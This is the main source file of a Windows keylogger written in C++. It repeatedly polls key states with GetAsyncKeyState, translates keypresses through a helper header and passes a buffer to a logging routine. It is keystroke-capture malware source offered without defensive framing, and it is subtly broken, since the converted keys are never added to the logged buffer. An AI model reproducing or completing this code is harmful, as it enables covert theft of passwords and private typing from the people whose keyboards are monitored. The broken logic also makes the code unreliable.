#include <iostream>
#include <windows.h>

#include "key-to-string.hpp"
#include "logger.hpp"

using namespace std;

string storage;

void handle_backspace() {
  if (!storage.empty()) {
    storage.pop_back();
  }
}

int main() {
  while (true) {
    // every key on the keyboard has a number called index
    // 65 = A
    for (int key = 8; key <= 190; key++) {
      if (GetAsyncKeyState(key) & 0x0001) {
        if (key == VK_BACK) {
          handle_backspace();
        } else {
          string KeySTR = key_to_string(key);
          if (!KeySTR.empty()) {
            log(storage);
          }
        }
      }
    }
  }
  return 0;
}
